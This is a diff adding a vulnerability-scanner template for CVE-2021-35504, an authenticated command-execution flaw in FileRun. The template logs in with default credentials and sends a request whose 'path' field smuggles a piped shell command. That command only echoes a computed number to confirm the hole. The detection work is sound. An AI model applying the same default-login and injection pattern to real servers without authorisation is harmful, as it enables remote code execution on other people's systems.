@@ -1,0 +1,60 @@
+id: CVE-2021-35504
+info:
+  name: FileRun 2021.03.26 Authenticated RCE
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    FileRun versions prior to 2021.03.26 contain a remote code execution vulnerability in the back-end ffmpeg inspection path. Exploiting this allows authenticated attackers to execute arbitrary commands on the server.
+  reference:
+    - https://syntegris-sec.github.io/filerun-advisory
+  classification:
+    cve-id:
+      - CVE-2021-35504
+
+variables:
+  rand1: '{{rand_int(2000, 2099)}}'
+  rand2: '{{rand_int(1000, 1099)}}'
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: login
+    method: POST
+    path:
+      - '{{BaseURL}}/?module=fileman&page=login&action=login'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: language=chinese; FileRunSID=fokipisqbs99di23dg5epp6i91
+    body: |
+      username=superuser&password=superuser&otp=&redirectAfterLogin=&two_step_secret=&language=
+    extractors:
+      - type: regex
+        name: session_id
+        internal: true
+        part: header
+        regex:
+          - 'Set-Cookie: FileRunSID=(.*?);'
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: execute-rce
+    method: POST
+    path:
+      - '{{BaseURL}}/?module=cpanel&section=settings&page=image_preview&action=checkFFmpeg'
+    headers:
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      Cookie: FileRunSID={{session_id}}
+    body: |
+      path=ffmpeg%7Cecho%20%60expr%20{{rand1}}%20-%20{{rand2}}%60
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '{{to_number(rand1)-to_number(rand2)}}'
+        part: body
+      - type: status
+        status:
+          - 200
